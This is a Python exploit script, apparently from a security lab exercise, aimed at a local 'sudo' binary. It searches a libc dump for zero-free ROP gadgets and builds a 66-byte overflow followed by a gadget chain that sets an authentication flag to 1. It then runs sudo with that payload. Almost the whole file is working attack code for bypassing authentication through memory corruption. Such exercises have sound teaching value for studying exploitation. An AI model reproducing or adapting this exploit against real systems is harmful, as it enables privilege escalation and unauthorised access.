import os
import sys
import struct

import assemble
from search import GadgetSearch

PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
DUMP_START_ADDR = 0xb7c39750
AUTH_ADDR = 0x0804A054
FINAL_RET_ADDR = 0x080488c6


def noZeroByte(x):
    # return true iff there isnt a zero byte in x
    mask = 0xff
    for i in range(4):
        byte = x & mask
        mask <<= 8
        if(byte == 0):
            return False
    return True


def get_arg():
    s = GadgetSearch(LIBC_DUMP_PATH, DUMP_START_ADDR)
    possible_regs = [
        'eax', 'ebx', 'ecx', 'edx', 'esi', 'edi'
    ]
    # for every couple of registers we search for our wanted
    # set of instructions, if we find 2 registers that satisfy
    # all instructions we break and proceed
    for perm in s.get_register_combos(2, possible_regs):
        reg1 = perm[0]
        reg2 = perm[1]
        try:
            pop_reg1 = s.find('pop {0}'.format(reg1), noZeroByte)
        except Exception:
            continue
        try:
            xor_reg2_reg2 = s.find('xor {0},{0}'.format(reg2), noZeroByte)
        except Exception:
            continue
        try:
            inc_reg2 = s.find('inc {0}'.format(reg2), noZeroByte)
        except Exception:
            continue
        try:
            mov_memReg1_reg2 = s.find('mov [{0}],{1}'.format(reg1, reg2), noZeroByte)
        except Exception:
            continue
        # if got to this point then we found 2 suitable registers
        # and addresses to instructions that we need
        break

    offset = 66
    buf = 'a' * offset
    shellcode = buf + struct.pack('<IIIIII', pop_reg1, AUTH_ADDR, xor_reg2_reg2,
                                  inc_reg2, mov_memReg1_reg2, FINAL_RET_ADDR)
    return shellcode


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
